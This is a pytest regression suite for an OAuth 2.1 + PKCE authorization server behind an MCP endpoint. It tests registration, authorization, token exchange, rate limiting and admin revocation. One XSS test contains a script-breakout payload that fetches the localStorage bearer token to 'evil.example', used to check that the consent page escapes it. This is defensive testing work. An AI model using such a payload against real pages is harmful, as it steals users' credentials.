"""Regression tests for the OAuth 2.1 + PKCE authorization server
(/.well-known/*, /oauth/*): the path a Connector-style MCP client uses
when it can't just be handed a plain bearer token. Exercises the full
discovery -> register -> authorize -> token -> use sequence end to end via
TestClient, plus the individual failure modes (PKCE mismatch, replay,
redirect_uri mismatch, expiry, unknown client, resource mismatch) each in
isolation.
"""

import base64
import hashlib
import secrets
from urllib.parse import parse_qs, urlparse

import pytest
from starlette.testclient import TestClient

from mcp_server import server as server_module
from mcp_server.auth import store as auth_store
from mcp_server.routes import oauth as routes_oauth


@pytest.fixture
def client(isolated_auth_store, isolated_sqlite_db, monkeypatch):
    monkeypatch.setenv("GOOGLE_OAUTH_CLIENT_ID", "test-client-id")
    monkeypatch.setattr(
        routes_oauth, "verify_credential", lambda credential, client_id: {"sub": "sub123", "email": "a@example.com"}
    )
    app = server_module.server.streamable_http_app()
    app.add_middleware(server_module.MultiTokenAuthMiddleware, owner_token="owner-secret")
    with TestClient(app) as c:
        yield c


def _pkce_pair():
    verifier = secrets.token_urlsafe(32)
    challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b"=").decode()
    return verifier, challenge


def _register(client, redirect_uri="https://example.com/callback", client_name="TestClient"):
    resp = client.post("/oauth/register", json={"redirect_uris": [redirect_uri], "client_name": client_name})
    assert resp.status_code == 201
    return resp.json()["client_id"]


def _authorize_and_get_code(client, client_id, redirect_uri, challenge, state="xyz", resource=None):
    resp = client.post(
        "/oauth/authorize",
        json={
            "credential": "fake-jwt",
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "code_challenge": challenge,
            "state": state,
            "resource": resource,
        },
    )
    assert resp.status_code == 200, resp.text
    redirect = resp.json()["redirect"]
    qs = parse_qs(urlparse(redirect).query)
    return qs["code"][0], qs.get("state", [None])[0]


# --- Discovery metadata ---------------------------------------------------


def test_protected_resource_metadata_points_at_this_server(client):
    resp = client.get("/.well-known/oauth-protected-resource/mcp")
    assert resp.status_code == 200
    body = resp.json()
    assert body["resource"].endswith("/mcp")
    assert body["authorization_servers"] == [body["resource"].removesuffix("/mcp")]


def test_protected_resource_metadata_available_at_bare_wellknown_path_too(client):
    resp = client.get("/.well-known/oauth-protected-resource")
    assert resp.status_code == 200
    assert resp.json()["resource"].endswith("/mcp")


def test_authorization_server_metadata_has_required_endpoints(client):
    resp = client.get("/.well-known/oauth-authorization-server")
    assert resp.status_code == 200
    body = resp.json()
    for key in ("authorization_endpoint", "token_endpoint", "registration_endpoint"):
        assert body[key].startswith(body["issuer"])
    assert body["code_challenge_methods_supported"] == ["S256"]


def test_401_on_mcp_includes_www_authenticate_pointing_at_discovery(client):
    resp = client.post("/mcp", json={})
    assert resp.status_code == 401
    www_auth = resp.headers["www-authenticate"]
    assert "resource_metadata=" in www_auth
    assert "/.well-known/oauth-protected-resource/mcp" in www_auth


def test_oauth_endpoints_carry_permissive_cors(client):
    resp = client.get("/.well-known/oauth-authorization-server")
    assert resp.headers["access-control-allow-origin"] == "*"


# --- Dynamic Client Registration -----------------------------------------


def test_register_returns_a_client_id(client):
    resp = client.post("/oauth/register", json={"redirect_uris": ["https://example.com/cb"], "client_name": "X"})
    assert resp.status_code == 201
    body = resp.json()
    assert body["client_id"]
    assert body["redirect_uris"] == ["https://example.com/cb"]
    assert body["token_endpoint_auth_method"] == "none"


def test_register_rejects_missing_redirect_uris(client):
    resp = client.post("/oauth/register", json={"client_name": "X"})
    assert resp.status_code == 400
    assert resp.json()["error"] == "invalid_client_metadata"


def test_register_rejects_non_absolute_redirect_uri(client):
    resp = client.post("/oauth/register", json={"redirect_uris": ["not-a-url"]})
    assert resp.status_code == 400


def test_register_rejects_malformed_json(client):
    resp = client.post("/oauth/register", content=b"not json", headers={"Content-Type": "application/json"})
    assert resp.status_code == 400


# --- Full round trip -------------------------------------------------------


def test_full_authorization_code_flow_yields_a_working_access_token(client):
    client_id = _register(client)
    verifier, challenge = _pkce_pair()
    code, state = _authorize_and_get_code(client, client_id, "https://example.com/callback", challenge)
    assert state == "xyz"

    resp = client.post(
        "/oauth/token",
        data={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": "https://example.com/callback",
            "client_id": client_id,
            "code_verifier": verifier,
        },
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["token_type"] == "Bearer"
    access_token = body["access_token"]

    resp = client.get("/api/sessions", headers={"Authorization": "Bearer " + access_token})
    assert resp.status_code == 200


def test_issued_token_is_distinct_from_the_plain_sign_in_token(client):
    """A user who has both signed in directly (getting a mcp_users token)
    and connected via OAuth should have two independent tokens, so
    disconnecting the OAuth client can't take down their direct config."""
    sign_in_token = auth_store.get_or_create_token("sub123", "a@example.com")

    client_id = _register(client)
    verifier, challenge = _pkce_pair()
    code, _ = _authorize_and_get_code(client, client_id, "https://example.com/callback", challenge)
    resp = client.post(
        "/oauth/token",
        data={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": "https://example.com/callback",
            "client_id": client_id,
            "code_verifier": verifier,
        },
    )
    oauth_token = resp.json()["access_token"]

    assert oauth_token != sign_in_token
    assert auth_store.is_valid_token(sign_in_token)
    assert auth_store.is_valid_token(oauth_token)
    assert auth_store.get_sub_for_token(oauth_token) == "sub123"


# --- Failure modes ----------------------------------------------------------


def test_authorize_rejects_unknown_client_id(client):
    verifier, challenge = _pkce_pair()
    resp = client.get(
        "/oauth/authorize",
        params={
            "response_type": "code",
            "client_id": "nonexistent",
            "redirect_uri": "https://example.com/callback",
            "code_challenge": challenge,
        },
    )
    assert resp.status_code == 400


def test_authorize_rejects_unregistered_redirect_uri(client):
    client_id = _register(client, redirect_uri="https://example.com/callback")
    verifier, challenge = _pkce_pair()
    resp = client.get(
        "/oauth/authorize",
        params={
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": "https://attacker.example/steal",
            "code_challenge": challenge,
        },
    )
    assert resp.status_code == 400


def test_authorize_rejects_non_s256_challenge_method(client):
    client_id = _register(client)
    resp = client.get(
        "/oauth/authorize",
        params={
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": "https://example.com/callback",
            "code_challenge": "whatever",
            "code_challenge_method": "plain",
        },
    )
    assert resp.status_code == 400


def test_authorize_rejects_wrong_response_type(client):
    resp = client.get("/oauth/authorize", params={"response_type": "token", "client_id": "x"})
    assert resp.status_code == 400


def test_token_exchange_rejects_wrong_pkce_verifier(client):
    client_id = _register(client)
    verifier, challenge = _pkce_pair()
    code, _ = _authorize_and_get_code(client, client_id, "https://example.com/callback", challenge)

    resp = client.post(
        "/oauth/token",
        data={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": "https://example.com/callback",
            "client_id": client_id,
            "code_verifier": "totally-wrong-verifier",
        },
    )
    assert resp.status_code == 400
    assert resp.json()["error"] == "invalid_grant"


def test_token_exchange_rejects_replayed_code(client):
    client_id = _register(client)
    verifier, challenge = _pkce_pair()
    code, _ = _authorize_and_get_code(client, client_id, "https://example.com/callback", challenge)
    token_request = {
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": "https://example.com/callback",
        "client_id": client_id,
        "code_verifier": verifier,
    }
    first = client.post("/oauth/token", data=token_request)
    assert first.status_code == 200
    second = client.post("/oauth/token", data=token_request)
    assert second.status_code == 400
    assert "already used" in second.json()["error_description"]


def test_token_exchange_rejects_mismatched_redirect_uri(client):
    client_id = _register(client)
    verifier, challenge = _pkce_pair()
    code, _ = _authorize_and_get_code(client, client_id, "https://example.com/callback", challenge)

    resp = client.post(
        "/oauth/token",
        data={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": "https://different.example/callback",
            "client_id": client_id,
            "code_verifier": verifier,
        },
    )
    assert resp.status_code == 400


def test_token_exchange_rejects_expired_code(client, monkeypatch):
    client_id = _register(client)
    verifier, challenge = _pkce_pair()

    real_issue = auth_store.issue_oauth_code
    monkeypatch.setattr(auth_store, "issue_oauth_code", lambda *a, **kw: real_issue(*a, ttl_seconds=-1, **kw))
    code, _ = _authorize_and_get_code(client, client_id, "https://example.com/callback", challenge)

    resp = client.post(
        "/oauth/token",
        data={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": "https://example.com/callback",
            "client_id": client_id,
            "code_verifier": verifier,
        },
    )
    assert resp.status_code == 400
    assert "expired" in resp.json()["error_description"]


def test_token_exchange_rejects_unsupported_grant_type(client):
    resp = client.post("/oauth/token", data={"grant_type": "client_credentials"})
    assert resp.status_code == 400
    assert resp.json()["error"] == "unsupported_grant_type"


def test_authorize_rejects_resource_mismatch(client):
    client_id = _register(client)
    verifier, challenge = _pkce_pair()
    resp = client.get(
        "/oauth/authorize",
        params={
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": "https://example.com/callback",
            "code_challenge": challenge,
            "resource": "https://not-this-server.example/mcp",
        },
    )
    assert resp.status_code == 400


def test_authorize_get_requires_google_client_id_configured(client, monkeypatch):
    monkeypatch.delenv("GOOGLE_OAUTH_CLIENT_ID", raising=False)
    client_id = _register(client)
    verifier, challenge = _pkce_pair()
    resp = client.get(
        "/oauth/authorize",
        params={
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": "https://example.com/callback",
            "code_challenge": challenge,
        },
    )
    assert resp.status_code == 503


# --- Security hardening: XSS, redirect_uri disclosure, strict validation --
# Found by an independent adversarial review of the OAuth implementation
# and fixed the same session. `state` (and friends) are attacker-reachable:
# anyone can register a client, then send a victim who's already signed in
# a crafted /oauth/authorize link. The consent page is the one place
# those values get embedded into HTML/JS, so it's the one place a bad
# value can turn into script execution on a page whose localStorage holds
# a real, non-expiring bearer token.


def test_authorize_page_escapes_a_script_breakout_in_state(client):
    """A state value containing a literal `</script>` must not appear
    unescaped in the response. json.dumps() alone does NOT escape `<`,
    so naively interpolating it into a <script> block lets the HTML
    parser close the tag early regardless of JS string-escaping rules."""
    client_id = _register(client)
    verifier, challenge = _pkce_pair()
    payload = "</script><script>fetch('https://evil.example/steal?c='+localStorage.getItem('mci_token'))</script>"
    resp = client.get(
        "/oauth/authorize",
        params={
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": "https://example.com/callback",
            "code_challenge": challenge,
            "state": payload,
        },
    )
    assert resp.status_code == 200
    assert "</script><script>fetch" not in resp.text
    assert "\\u003c/script\\u003e\\u003cscript\\u003e" in resp.text


def test_authorize_rejects_state_over_length_cap(client):
    client_id = _register(client)
    verifier, challenge = _pkce_pair()
    resp = client.get(
        "/oauth/authorize",
        params={
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": "https://example.com/callback",
            "code_challenge": challenge,
            "state": "x" * 3000,
        },
    )
    assert resp.status_code == 400


def test_authorize_rejects_empty_string_code_challenge_method(client):
    """An empty string is falsy, so the old `if code_challenge_method and
    ... != "S256"` check silently let it through. Only the explicit
    whitelist catches it."""
    client_id = _register(client)
    verifier, challenge = _pkce_pair()
    resp = client.get(
        "/oauth/authorize",
        params={
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": "https://example.com/callback",
            "code_challenge": challenge,
            "code_challenge_method": "",
        },
    )
    assert resp.status_code == 400


def test_authorize_page_discloses_the_actual_redirect_host(client):
    """client_name is free text set at registration time and proves
    nothing: the redirect host is what's actually bound to the
    registration, so the consent page must show it, not just the name."""
    client_id = _register(client, redirect_uri="https://attacker.example/cb", client_name="Totally Legit Claude")
    verifier, challenge = _pkce_pair()
    resp = client.get(
        "/oauth/authorize",
        params={
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": "https://attacker.example/cb",
            "code_challenge": challenge,
        },
    )
    assert resp.status_code == 200
    assert "attacker.example" in resp.text


def test_register_rejects_non_loopback_http_redirect_uri(client):
    resp = client.post("/oauth/register", json={"redirect_uris": ["http://attacker.example/cb"]})
    assert resp.status_code == 400


def test_register_allows_loopback_http_redirect_uri(client):
    """The standard OAuth carve-out for public clients (e.g. a CLI tool)
    that can't get a real TLS cert for localhost."""
    resp = client.post("/oauth/register", json={"redirect_uris": ["http://127.0.0.1:8765/cb"]})
    assert resp.status_code == 201


def test_redeem_oauth_code_is_atomic_against_concurrent_redemption(isolated_auth_store):
    """The consume step must be a single UPDATE ... WHERE consumed_at IS
    NULL, not a separate check-then-act; otherwise two racing
    redemptions of the same code could both pass the "not yet consumed"
    read before either writes, and both would succeed. Simulates the
    race directly at the store layer since TestClient requests are
    sequential."""
    client_id = auth_store.register_oauth_client(["https://example.com/cb"])
    verifier, challenge = _pkce_pair()
    code = auth_store.issue_oauth_code(
        client_id, "sub1", "a@example.com", "https://example.com/cb", challenge, "https://host/mcp"
    )

    first = auth_store.redeem_oauth_code(code, client_id, "https://example.com/cb", verifier, "https://host/mcp")
    assert first == ("sub1", "a@example.com")

    with pytest.raises(ValueError, match="already used"):
        auth_store.redeem_oauth_code(code, client_id, "https://example.com/cb", verifier, "https://host/mcp")


# --- Rate limiting on /oauth/register ---------------------------------------


def test_register_allows_up_to_the_limit(client):
    for i in range(routes_oauth._REGISTER_MAX_PER_WINDOW):
        resp = client.post("/oauth/register", json={"redirect_uris": [f"https://example.com/cb{i}"]})
        assert resp.status_code == 201


def test_register_rate_limits_after_the_limit(client):
    for i in range(routes_oauth._REGISTER_MAX_PER_WINDOW):
        client.post("/oauth/register", json={"redirect_uris": [f"https://example.com/cb{i}"]})
    resp = client.post("/oauth/register", json={"redirect_uris": ["https://example.com/one-too-many"]})
    assert resp.status_code == 429


def test_register_rate_limit_is_per_ip(client):
    """A rejected attempt from IP A must not count against IP B's own
    window, since each caller's CF-Connecting-IP is tracked independently."""
    for i in range(routes_oauth._REGISTER_MAX_PER_WINDOW):
        resp = client.post(
            "/oauth/register",
            json={"redirect_uris": [f"https://example.com/cb{i}"]},
            headers={"CF-Connecting-IP": "1.1.1.1"},
        )
        assert resp.status_code == 201
    # 1.1.1.1 is now exhausted...
    resp = client.post(
        "/oauth/register", json={"redirect_uris": ["https://example.com/blocked"]}, headers={"CF-Connecting-IP": "1.1.1.1"}
    )
    assert resp.status_code == 429
    # ...but a different IP is unaffected.
    resp = client.post(
        "/oauth/register", json={"redirect_uris": ["https://example.com/fine"]}, headers={"CF-Connecting-IP": "2.2.2.2"}
    )
    assert resp.status_code == 201


def test_register_rate_limit_also_counts_malformed_requests(client):
    """The limiter checks BEFORE parsing the body, deliberately: an
    attacker flooding with garbage payloads to dodge the counter must
    not get unlimited attempts."""
    for _ in range(routes_oauth._REGISTER_MAX_PER_WINDOW):
        resp = client.post("/oauth/register", content=b"not json", headers={"Content-Type": "application/json"})
        assert resp.status_code == 400
    resp = client.post("/oauth/register", json={"redirect_uris": ["https://example.com/blocked"]})
    assert resp.status_code == 429


# --- Admin visibility into OAuth clients/tokens -----------------------------


def test_admin_oauth_client_routes_require_the_owner_token(client):
    client_id = _register(client)
    resp = client.get("/api/oauth-clients", headers={"Authorization": "Bearer owner-secret"})
    assert resp.status_code == 200
    assert any(c["client_id"] == client_id for c in resp.json())


def test_admin_oauth_client_routes_reject_a_per_user_token(client):
    client_id = _register(client)
    verifier, challenge = _pkce_pair()
    code, _ = _authorize_and_get_code(client, client_id, "https://example.com/callback", challenge)
    token_resp = client.post(
        "/oauth/token",
        data={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": "https://example.com/callback",
            "client_id": client_id,
            "code_verifier": verifier,
        },
    )
    access_token = token_resp.json()["access_token"]

    resp = client.get("/api/oauth-clients", headers={"Authorization": "Bearer " + access_token})
    assert resp.status_code == 403


def test_admin_can_revoke_an_oauth_client(client):
    client_id = _register(client)
    resp = client.delete(f"/api/oauth-clients/{client_id}", headers={"Authorization": "Bearer owner-secret"})
    assert resp.status_code == 200
    resp = client.get("/api/oauth-clients", headers={"Authorization": "Bearer owner-secret"})
    assert all(c["client_id"] != client_id for c in resp.json())


def test_admin_can_list_and_revoke_oauth_tokens(client):
    client_id = _register(client)
    verifier, challenge = _pkce_pair()
    code, _ = _authorize_and_get_code(client, client_id, "https://example.com/callback", challenge)
    token_resp = client.post(
        "/oauth/token",
        data={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": "https://example.com/callback",
            "client_id": client_id,
            "code_verifier": verifier,
        },
    )
    access_token = token_resp.json()["access_token"]

    resp = client.get("/api/oauth-tokens", headers={"Authorization": "Bearer owner-secret"})
    assert resp.status_code == 200
    tokens = resp.json()
    assert len(tokens) == 1
    assert "token" not in tokens[0]

    resp = client.delete(f"/api/oauth-tokens/{access_token}", headers={"Authorization": "Bearer owner-secret"})
    assert resp.status_code == 200

    resp = client.get("/api/sessions", headers={"Authorization": "Bearer " + access_token})
    assert resp.status_code == 401
